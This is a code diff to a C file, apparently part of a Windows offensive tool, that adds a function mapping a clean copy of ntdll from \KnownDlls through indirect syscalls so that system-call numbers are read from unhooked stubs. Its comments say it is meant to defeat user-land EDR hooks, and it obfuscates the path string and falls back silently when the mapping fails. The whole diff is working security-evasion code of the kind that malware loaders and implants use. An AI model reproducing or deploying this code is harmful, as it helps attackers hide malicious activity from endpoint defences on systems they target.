@@ -1,9 +1,11 @@
 // =============================================
 // Syscalls.c - Indirect Syscall Engine
 //   + Gadget Pool Randomization
+//   + Clean-ntdll via \KnownDlls\ntdll.dll
 // =============================================
 
 #include "Common.h"
+#include <winternl.h>  // UNICODE_STRING, OBJECT_ATTRIBUTES
 
 // Global ntdll config
 static NTDLL_CONFIG g_NtdllConfig = { 0 };
@@ -207,9 +209,119 @@ BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {
 }
 
 // -----------------------------------------------
+// Attempt to swap g_NtdllConfig's export-table
+// pointers to a clean ntdll mapped from the
+// \KnownDlls\ntdll.dll section.
+//
+// The gadget pool (already built) still points into
+// the original PEB-loaded ntdll's RX memory, so the
+// syscall;ret instructions remain valid; only the
+// SSN bytes come from the clean copy.
+//
+// This defeats user-land EDR hooks that overwrite
+// ntdll stub prologues — the clean mapping's stubs
+// still hold the real `mov eax, SSN` pattern.
+//
+// If the section can't be opened/mapped (PPL
+// restriction, stripped image, etc.) the function
+// returns FALSE and the caller continues with the
+// PEB-ntdll exports as the SSN source (graceful
+// fallback — same behavior as before this patch).
+// -----------------------------------------------
+static BOOL SwitchToCleanNtdll(IN PNT_SYSCALL pNtOpen, IN PNT_SYSCALL pNtMap) {
+
+    // Decode "\KnownDlls\ntdll.dll" and widen to WCHAR
+    BYTE xPath[] = XSTR_KNOWNDLLS_NTDLL;
+    DEOBF(xPath);
+
+    WCHAR  wPath[32] = { 0 };
+    USHORT uLenBytes = 0;
+    for (DWORD k = 0; xPath[k] && k < 31; k++) {
+        wPath[k] = (WCHAR)xPath[k];
+        uLenBytes += sizeof(WCHAR);
+    }
+
+    UNICODE_STRING uName;
+    uName.Length        = uLenBytes;
+    uName.MaximumLength = uLenBytes + sizeof(WCHAR);
+    uName.Buffer        = wPath;
+
+    OBJECT_ATTRIBUTES oa;
+    MemSet(&oa, 0, sizeof(oa));
+    oa.Length                   = sizeof(oa);
+    oa.RootDirectory            = NULL;
+    oa.ObjectName               = &uName;
+    oa.Attributes               = 0x40;     // OBJ_CASE_INSENSITIVE
+    oa.SecurityDescriptor       = NULL;
+    oa.SecurityQualityOfService = NULL;
+
+    // NtOpenSection(&hSection, SECTION_MAP_READ|SECTION_QUERY, &oa)
+    HANDLE hSection = NULL;
+    SET_SYSCALL(*pNtOpen);
+    NTSTATUS status = RunSyscall(
+        (ULONG_PTR)&hSection,
+        (ULONG_PTR)0x0005,                  // SECTION_MAP_READ | SECTION_QUERY
+        (ULONG_PTR)&oa,
+        0, 0, 0, 0, 0, 0, 0, 0, 0
+    );
+    if (!NT_SUCCESS(status) || !hSection)
+        return FALSE;
+
+    // NtMapViewOfSection(hSection, -1, &pClean, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READONLY)
+    PVOID  pClean   = NULL;
+    SIZE_T uViewSize = 0;
+    SET_SYSCALL(*pNtMap);
+    status = RunSyscall(
+        (ULONG_PTR)hSection,
+        (ULONG_PTR)(HANDLE)-1,              // NtCurrentProcess
+        (ULONG_PTR)&pClean,
+        (ULONG_PTR)0,                       // ZeroBits
+        (ULONG_PTR)0,                       // CommitSize
+        (ULONG_PTR)NULL,                    // SectionOffset
+        (ULONG_PTR)&uViewSize,
+        (ULONG_PTR)2,                       // ViewUnmap
+        (ULONG_PTR)0,                       // AllocationType
+        (ULONG_PTR)0x02,                    // PAGE_READONLY (SEC_IMAGE ignores)
+        0, 0
+    );
+    if (!NT_SUCCESS(status) || !pClean)
+        return FALSE;
+
+    // Parse clean PE to locate the export directory
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pClean;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
+        return FALSE;
+
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pClean + pDos->e_lfanew);
+    if (pNt->Signature != IMAGE_NT_SIGNATURE)
+        return FALSE;
+
+    if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0)
+        return FALSE;
+
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)pClean + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+    );
+
+    // Swap g_NtdllConfig to the clean mapping. Gadget pool addresses
+    // (PEB-ntdll RX) stay valid — SET_SYSCALL() still executes real
+    // `syscall;ret` in the original loaded ntdll.
+    g_NtdllConfig.uModule             = (ULONG_PTR)pClean;
+    g_NtdllConfig.dwNumberOfNames     = pExport->NumberOfNames;
+    g_NtdllConfig.pdwArrayOfAddresses = (PDWORD)((PBYTE)pClean + pExport->AddressOfFunctions);
+    g_NtdllConfig.pdwArrayOfNames     = (PDWORD)((PBYTE)pClean + pExport->AddressOfNames);
+    g_NtdllConfig.pwArrayOfOrdinals   = (PWORD)((PBYTE)pClean + pExport->AddressOfNameOrdinals);
+    return TRUE;
+}
+
+// -----------------------------------------------
 // Initialize all needed syscalls + gadget pool.
-// Single-pass over ntdll exports: hashes each name once
-// and matches against the target table (O(N) vs O(N*K)).
+//
+// Pipeline:
+//   1. PEB-ntdll config + gadget pool (RX memory)
+//   2. Bootstrap NtOpenSection + NtMapViewOfSection from PEB-ntdll
+//   3. Swap g_NtdllConfig to clean \KnownDlls\ntdll.dll (best-effort)
+//   4. Single-pass resolve all 5 target syscalls from (now clean) config
 // -----------------------------------------------
 BOOL InitializeNtSyscalls(OUT PNTAPI_FUNC pNtApis) {
 
@@ -219,6 +331,17 @@ BOOL InitializeNtSyscalls(OUT PNTAPI_FUNC pNtApis) {
     // Build gadget pool BEFORE resolving individual syscalls
     if (!CollectSyscallGadgets())
         return FALSE;
+
+    // Bootstrap: extract NtOpenSection + NtMapViewOfSection from PEB-ntdll
+    // so we can map a clean ntdll copy. If the PEB stubs are hooked, the
+    // neighbor-stub fallback in ResolveSyscallStub recovers the real SSN.
+    NT_SYSCALL ntOpen = { 0 };
+    NT_SYSCALL ntMap  = { 0 };
+    if (FetchNtSyscall(NtOpenSection_JOAAT, &ntOpen) &&
+        FetchNtSyscall(NtMapViewOfSection_JOAAT, &ntMap)) {
+        // Best-effort: on failure we silently keep the PEB-ntdll source.
+        SwitchToCleanNtdll(&ntOpen, &ntMap);
+    }
 
     struct {
         DWORD       dwHash;
